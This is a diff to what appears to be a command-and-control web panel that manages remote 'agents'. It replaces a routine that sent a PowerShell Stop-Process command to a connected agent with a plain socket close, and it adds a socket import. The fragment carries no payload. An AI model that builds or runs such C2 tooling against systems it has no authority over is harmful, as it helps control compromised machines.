@@ -7,6 +7,7 @@ from apps.home.db import allAgents, operationResults
 from c2server.server import *
 from apps.exploit.operation import *
 import os
+import socket
 # from exploit import attacker
 
 @blueprint.route('/')
@@ -88,11 +89,7 @@ def terminate_connections(id):
             if client_status == 'Alive' and connections != []:
                 for conn in connections:
                     if conn[6] == client_id:
-                        conn[1].send(b"\n")
-                        time.sleep(1)
-                        conn[1].send("Stop-Process -Name 'agent'".encode() + b"\n")
-                        time.sleep(1)
-                        conn[1].recv(1048)
+                        conn[1].close()
             db.execute("DELETE FROM all_agents where id=?", id)
             db.commit()
             return redirect(request.referrer)
@@ -217,4 +214,3 @@ def execute_driver():
             window.alert("No Agent Selected");
             window.location.href = document.referrer;
         </script>"""
-
